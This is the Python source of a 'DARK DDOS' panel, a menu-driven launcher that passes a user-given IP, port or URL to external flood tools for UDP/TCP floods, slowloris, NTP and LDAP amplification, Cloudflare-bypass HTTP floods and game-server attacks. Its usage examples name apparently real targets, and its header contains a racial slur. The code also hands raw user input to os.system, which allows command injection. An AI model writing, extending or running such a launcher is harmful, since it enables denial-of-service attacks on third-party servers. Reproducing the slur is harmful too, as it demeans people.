##############################
# DARK DDOS Made by @darkofmaster   #
# COPY = NIGGER              #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

# ========== FETCHING SYSTEM ==========
def fetching_animation():
    frames = [
        "\033[91m[■□□□□□□□□□] 0%  \033[0m",
        "\033[93m[■■□□□□□□□□] 10% \033[0m",
        "\033[93m[■■■□□□□□□□] 20% \033[0m",
        "\033[93m[■■■■□□□□□□] 30% \033[0m",
        "\033[92m[■■■■■□□□□□] 40% \033[0m",
        "\033[92m[■■■■■■□□□□] 50% \033[0m",
        "\033[92m[■■■■■■■□□□] 60% \033[0m",
        "\033[94m[■■■■■■■■□□] 70% \033[0m",
        "\033[94m[■■■■■■■■■□] 80% \033[0m",
        "\033[94m[■■■■■■■■■■] 90% \033[0m",
        "\033[95m[■■■■■■■■■■] 100%\033[0m"
    ]
    for frame in frames:
        sys.stdout.write("\r" + "\033[92m[FETCHING] \033[0m" + frame)
        sys.stdout.flush()
        time.sleep(0.15)
    print("\n")

# ========== NEW FRAME DESIGN ==========
def top_frame():
    print("")
    print(" " * 12 + "\033[91m╔═══════════════════════════════════════════════════╗\033[0m")
    print(" " * 12 + "\033[91m║          DARK DDOS  —  @darkofmaster            ║\033[0m")
    print(" " * 12 + "\033[91m╚═══════════════════════════════════════════════════╝\033[0m")

def section_header(title):
    print("")
    print(" " * 16 + "\033[91m┌─────────────────────────────────────┐\033[0m")
    print(" " * 16 + f"\033[91m│          {title:^25s}       │\033[0m")
    print(" " * 16 + "\033[91m└─────────────────────────────────────┘\033[0m")

def menu_box(items):
    print(" " * 12 + "\033[91m┌──────────────────────┬──────────────────────┐\033[0m")
    for i in range(0, len(items), 2):
        left = items[i] if i < len(items) else ""
        right = items[i+1] if i+1 < len(items) else ""
        if left and right:
            print(" " * 12 + f"\033[91m│  \033[92m{left:<18}\033[91m│  \033[92m{right:<18}\033[91m│\033[0m")
        elif left:
            print(" " * 12 + f"\033[91m│  \033[92m{left:<18}\033[91m│  {'':<20}│\033[0m")
    print(" " * 12 + "\033[91m└──────────────────────┴──────────────────────┘\033[0m")

def ascii_vro():
    clear()
    frames = [
        '''
     \033[91m/ **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  \033[0m
        ''',
        '''
     \033[91m/ **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  \033[0m
        ''',
        '''
     \033[91m/ **/|        
     | == /        
      |  |                  
      \033[0m
        ''',
    ]
    for frame in frames:
        clear()
        print(frame)
        time.sleep(0.6)
    clear()
    # Blackhat Logo ASCII
    print("""\033[91m
    ██████╗ ██╗   ██╗██╗     ███╗   ██╗███████╗██████╗ ███████╗██████╗ 
    ██╔══██╗██║   ██║██║     ████╗  ██║██╔════╝██╔══██╗██╔════╝██╔══██╗
    ██████╔╝██║   ██║██║     ██╔██╗ ██║█████╗  ██████╔╝█████╗  ██████╔╝
    ██╔══██╗██║   ██║██║     ██║╚██╗██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗
    ██████╔╝╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║███████╗██║  ██║
    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    \033[0m""")
    print(" " * 28 + "\033[91m[ BLACKHAT SECURITY ]\033[0m")
    time.sleep(1)
    clear()

def si():
    print("")
    print('\033[91m[ \033[92mDark \033[91m] | \033[97mWelcome to Dark Master! \033[91m| \033[97mOwner: @darkofmaster \033[91m| \033[97mUpdate v1.1\033[0m')
    print("")

def tools():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("TOOLS")
    menu_box(["geoip", "reverse-dns", "reverseip", "", "subnet-lookup", "", "asn-lookup", "", "dns-lookup", ""])

def banners():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("BANNERS")
    menu_box(["troll", "", "pikachu", ""])

def rules():
    clear()
    fetching_animation()
    si()
    top_frame()
    print("")
    print(" " * 12 + "\033[91m┌──────────────────────────────────────────────────┐\033[0m")
    print(" " * 12 + "\033[91m│                \033[92mRULES\033[91m                              │\033[0m")
    print(" " * 12 + "\033[91m├──────────────────────────────────────────────────┤\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m2. Do not attack .gov/.gob/.edu/.mil domains     \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m4. Only attack stress testing servers            \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m5. Don't skid the panel                          \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m6. Give a star to the github repository          \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m7. The creator does not do any harm              \033[91m│\033[0m")
    print(" " * 12 + "\033[91m└──────────────────────────────────────────────────┘\033[0m")

def ports():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("PORTS")
    print(" " * 12 + "\033[91m┌──────────────────────────────────────────────────┐\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m21\033[97m - SFTP      \033[92m69\033[97m  - TFTP     \033[92m5060\033[97m - RIP     \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m22\033[97m - SSH       \033[92m80\033[97m  - HTTP     \033[92m30120\033[97m - FIVEM   \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m23\033[97m - TELNET    \033[92m443\033[97m - HTTPS              \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m25\033[97m - SMTP      \033[92m3074\033[97m - XBOX               \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m53\033[97m - DNS       \033[92m5060\033[97m - PLAYSATION          \033[91m│\033[0m")
    print(" " * 12 + f"\033[91m│ \033[92m25565\033[97m - MINECRAFT           \033[91m│\033[0m")
    print(" " * 12 + "\033[91m└──────────────────────────────────────────────────┘\033[0m")

def special():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("SPECIAL")
    menu_box(["stress", ""])

def layer7():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("LAYER 7")
    menu_box(["http-raw", "crash", "http-socket", "httpflood", "http-storm", "cf-socket", "http-rand", "cf-pro", "overflow", "hyper", "cf-bypass", "slow", "uambypass", "https-spoof", "ovh-raw", "ovh-beam"])

def layer4():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("LAYER 4")
    menu_box(["udp", "tcp", "nfo-killer", "std", "udpbypass", "destroy", "home", "god", "slowloris", "flux", "stdv2", ""])

def amp_games():
    clear()
    fetching_animation()
    si()
    top_frame()
    section_header("AMP / GAMES")
    menu_box(["ovh-amp", "ovh-amp", "minecraft", "std", "samp", "ldap"])

def menu():
    sys.stdout.write(f"\033]2;DARK DDOS --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\007")
    clear()
    fetching_animation()
    print('')
    print('\033[91m[ \033[92mDark \033[91m] | \033[97mWelcome to Dark Master! \033[91m| \033[97mOwner: @darkofmaster \033[91m| \033[97mUpdate v1.1\033[0m')
    print("")
    print("""\033[91m
                        ╔═╗ ═╗ ╦  ╔═╗  ╔╦╗  ╔╦╗  ╔═╗  ╔═╗
                        ╔═╝ ╔╩╦╝  ║     ║║   ║║  ║ ║  ╚═╗
                        ╚═╝ ╩ ╚═  ╚═╝  ═╩╝  ═╩╝  ╚═╝  ╚═╝\033[0m
                \033[91m╔══════════════════════════════════════════════╗
                \033[91m║          \033[97mWelcome to DARK DDoS Panel        \033[91m║
                \033[91m║ \033[95m- - - - - - \033[97mFree DDoS Panel 2022\033[91m- - - - - - -\033[95m║
                \033[91m╚══════════════════════════════════════════════╝
                    \033[91m╔════════════════════════════════════════╗
                    \033[91m║ \033[97mhttps://github.com/hoaan1995/DARK.DDoS \033[91m║
                    \033[91m╚════════════════════════════════════════╝
                \033[91m╔══════════════════════════════════════════════╗
                \033[91m║   \033[97m   Type help to see the all commands.      \033[91m║
                \033[91m╚══════════════════════════════════════════════╝
\033[0m""")

def main():
    menu()
    while(True):
        cnc = input('''\033[91m╔══[\033[92mDARK\033[91m@\033[92mDDOS\033[91m]
\033[91m╚\033[92m═\033[91m═\033[92m═\033[91m═\033[92m═\033[91m➤ \033[97m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

        # LAYER 4 METHODS   
        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('\033[92mUsage: udpbypass <ip> <port>\033[0m')
                print('\033[92mExample: udpbypass 1.1.1.1 80\033[0m')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('\033[92mUsage: stdv2 <ip> <port>\033[0m')
                print('\033[92mExample: stdv2 1.1.1.1 80\033[0m')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('\033[92mUsage: flux <ip> <port> <threads>\033[0m')
                print('\033[92mExample: flux 1.1.1.1 80 250\033[0m')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('\033[92mUsage: slowloris <ip> <port>\033[0m')
                print('\033[92mExample: slowloris 1.1.1.1 80\033[0m')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('\033[92mUsage: god <ip> <port> <time>\033[0m')
                print('\033[92mExample: god 1.1.1.1 80 60\033[0m')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('\033[92mUsage: destroy <ip> <port> <time>\033[0m')
                print('\033[92mExample: destroy 1.1.1.1 80 60\033[0m')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('\033[92mUsage: std <ip> <port>\033[0m')
                print('\033[92mExample: std 1.1.1.1 80\033[0m')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('\033[92mUsage: home <ip> <port> <packet_size> <time>\033[0m')
                print('\033[92mExample: home 1.1.1.1 80 65500 60\033[0m')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('\033[92mUsage: udp <ip> <port>\033[0m')
                print('\033[92mExample: udp 1.1.1.1 80\033[0m')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('\033[92mUsage: nfo-killer <ip> <port> <threads> <time>\033[0m')
                print('\033[92mExample: nfo-killer 1.1.1.1 80 850 60\033[0m')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('\033[92mUsage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>\033[0m')
                print('\033[92mExample: ovh-raw GET 1.1.1.1 80 60 8500\033[0m')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('\033[92mUsage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>\033[0m')
                print('\033[92mExample: tcp GET 1.1.1.1 80 60 8500\033[0m')

        # SPECIAL METHODS
        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('\033[92mUsage: stress <ip> <port> <mode> <connection> <seconds> <timeout>\033[0m')
                print('\033[92mMODE: [1] TCP\033[0m')
                print('\033[92m      [2] UDP\033[0m')
                print('\033[92m      [3] HTTP\033[0m')
                print('\033[92mExample: stress 1.1.1.1 80 3 1250 60 5\033[0m')
                
        # AMP/GAMES METHODS
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('\033[92mUsage: samp <ip> <port>\033[0m')
                print('\033[92mExample: samp 1.1.1.1 7777\033[0m')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('\033[92mUsage: ldap <ip> <port> <threads> <time>\033[0m')
                print('\033[92mExample: ldap 1.1.1.1 80 650 60\033[0m')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('\033[92mUsage: minecraft <ip> <throttle> <threads> <time>\033[0m')
                print('\033[92mExample: minecraft 1.1.1.1 5000 500 60\033[0m')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('\033[92mUsage: ovh-amp <ip> <port>\033[0m')
                print('\033[92mExample: ovh-amp 1.1.1.1 80\033[0m')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('\033[92mUsage: ntp <ip> <port> <throttle> <time>\033[0m')
                print('\033[92mExample: ntp 1.1.1.1 22 250 60\033[0m')

        # LAYER 7 METHODS
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('\033[92mUsage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>\033[0m')
                print('\033[92mExample: ovh-beam GET 51.38.92.223 80 60\033[0m')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('\033[92mUsage: https-spoof <url> <time> <threads>\033[0m')
                print('\033[92mExample: https-spoof http://vailon.com 60 500\033[0m')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('\033[92mUsage: slow <url> <time>\033[0m')
                print('\033[92mExample: slow http://vailon.com 60\033[0m')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('\033[92mUsage: hyper <url> <time>\033[0m')
                print('\033[92mExample: hyper http://vailon.com 60\033[0m')
                
        elif "cf-socket" in cnc:
            print('\033[92mRunning cf-socket...\033[0m')
            os.system(f'python3 bypass.py')
    
        elif "cf-pro" in cnc:
            print('\033[92mRunning cf-pro...\033[0m')
            os.system(f'python3 cf-pro.py')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('\033[92mUsage: http-socket <url> <per> <time>\033[0m')
                print('\033[92mExample: http-socket http://example.com 5000 60\033[0m')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('\033[92mUsage: http-raw <url> <time>\033[0m')
                print('\033[92mExample: http-raw http://example.com 60\033[0m')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('\033[92mUsage: http-requests <url> <time>\033[0m')
                print('\033[92mExample: http-requests http://example.org 60\033[0m')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('\033[92mUsage: http-rand <url> <time>\033[0m')
                print('\033[92mExample: http-rand http://vailon.com/ 60\033[0m')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('\033[92mUsage: overflow <ip> <port> <threads>\033[0m')
                print('\033[92mExample: overflow 1.1.1.1 80 5000\033[0m')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('\033[92mUsage: cf-bypass <url> <time> <threads>\033[0m')
                print('\033[92mExample: cf-bypass http://example.com 60 1250\033[0m')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('\033[92mUsage: uambypass <url> <time> <req_per_ip>\033[0m')
                print('\033[92mExample: uambypass http://example.com 60 1250\033[0m')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('\033[92mUsage: crash <url> METHODS<GET/POST>\033[0m')
                print('\033[92mExample: crash http://example.com GET\033[0m')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('\033[92mUsage: httpflood <url> <threads> METHODS<GET/POST> <time>\033[0m')
                print('\033[92mExample: httpflood http://example.com 15000 get 60\033[0m')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('\033[92mUsage: httpget <url>\033[0m')
                print('\033[92mExample: httpget http://example.com\033[0m')

        # BANNERS
        elif "troll" in cnc:
            print('\033[92m░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   \033[0m')
            print('\033[92m░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  \033[0m')
            print('\033[92m░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  \033[0m')
            print('\033[92m░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  \033[0m')
            print('\033[92m░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  \033[0m')
            print('\033[92m█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  \033[0m')
            print('\033[92m█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  \033[0m')
            print('\033[92m░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  \033[0m')
            print('\033[92m░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  \033[0m')
            print('\033[92m░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  \033[0m')
            print('\033[92m░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  \033[0m')
            print('\033[92m░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  \033[0m')
            print('\033[92m░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  \033[0m')
            print('\033[92m░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  \033[0m')
            print('\033[92m░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  \033[0m')

        elif "pikachu" in cnc:
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  \033[0m')
            print('\033[92m⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  \033[0m')
            print('\033[92m⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  \033[0m')
            print('\033[92m⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  \033[0m')
